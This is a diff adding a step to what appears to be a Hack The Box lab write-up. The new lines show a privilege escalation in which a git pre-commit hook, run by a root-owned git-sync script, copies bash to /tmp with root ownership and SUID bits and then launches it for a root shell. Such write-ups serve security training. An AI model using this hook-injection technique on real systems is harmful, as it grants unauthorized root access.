@@ -93,3 +93,11 @@ ssh -i id_rsa dev01@10.10.11.164
 ./pspy64
 ```
 ![image](https://github.com/regarmulia/HTB/assets/33616880/0370c502-059d-4b9c-8101-6b96ae788174)
+
+
+```
+/usr/local/bin/git-sync
+echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchown root:root /tmp/0xdf\nchmod 4777 /tmp/0xdf' > pre-commit
+ls -l /tmp/0xdf
+/tmp/0xdf -p
+```
